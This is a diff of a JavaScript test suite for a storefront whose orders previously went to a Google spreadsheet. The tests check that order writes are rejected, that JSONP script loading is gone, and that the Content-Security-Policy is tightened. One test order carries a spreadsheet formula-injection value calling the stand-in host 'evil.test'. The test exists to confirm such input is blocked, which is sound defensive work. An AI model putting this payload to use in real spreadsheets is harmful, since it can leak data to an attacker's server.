@@ -27,3 +27,8 @@ const post=payload=>JSON.parse(gs.doPost({postData:{contents:JSON.stringify(payl
 assert.equal(post({orderId:'fake',items:[]}).ok,false);assert.equal(sheetAccess,0);
 const order={token:'server-token',orderId:'TRK-test',customer:{name:'=IMPORTXML("https://evil.test")',contact:'+233000000000'},items:[],estimatedTotal:100};assert.equal(post(order).ok,false);assert.equal(rows.length,0);assert.equal(sheetAccess,0);
 console.log('Storefront passed: pagination/filter resets, separate shipping, required-field UI, safe markup/URLs, CSP, retired spreadsheet order writes.');
+
+assert(!app.includes('window.receiveTrikonicProducts'));
+assert(!app.includes('script.src = url.toString()'));
+assert(app.includes('/functions/v1/public-catalog'));
+assert(!headers['Content-Security-Policy'].match(/script-src[^;]*script\.google/));
